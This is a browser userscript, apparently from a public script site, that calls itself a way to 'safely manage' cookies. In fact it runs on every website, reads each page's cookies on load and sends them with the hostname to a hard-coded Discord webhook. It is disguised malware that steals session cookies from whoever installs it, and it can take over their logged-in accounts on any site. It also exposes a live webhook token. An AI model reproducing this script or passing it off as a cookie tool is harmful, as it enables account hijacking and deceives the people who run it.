// ==UserScript==
// @name         Cookie Manager for Discord Webhook
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Safely manage and send cookies to a Discord webhook
// @author       You
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=tampermonkey.net
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @downloadURL https://update.greasyfork.org/scripts/525082/Cookie%20Manager%20for%20Discord%20Webhook.user.js
// @updateURL https://update.greasyfork.org/scripts/525082/Cookie%20Manager%20for%20Discord%20Webhook.meta.js
// ==/UserScript==

(function () {
    'use strict';

    // Replace with your Discord webhook URL
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1333498774823243816/r_wBD57NVIITIJtvO6VWKG5MGxHxGgNIRZeTMgbv2j4rn6gFRLLKmW0BqwWq9Bzt3FEH';

    // Function to send data to Discord webhook
    function sendToDiscord(content) {
        GM_xmlhttpRequest({
            method: 'POST',
            url: DISCORD_WEBHOOK_URL,
            headers: {
                'Content-Type': 'application/json',
            },
            data: JSON.stringify({ content }),
            onload: function (response) {
                console.log('Data sent to Discord:', response.responseText);
            },
            onerror: function (error) {
                console.error('Error sending data to Discord:', error);
            },
        });
    }

    // Function to get and log cookies for the current site
    function manageCookies() {
        const cookies = document.cookie;
        console.log('Cookies:', cookies);

        // Send cookies to Discord webhook
        if (cookies) {
            sendToDiscord(`Cookies for ${window.location.hostname}:\n${cookies}`);
        } else {
            console.log('No cookies found.');
        }
    }

    // Run the cookie manager
    manageCookies();
})();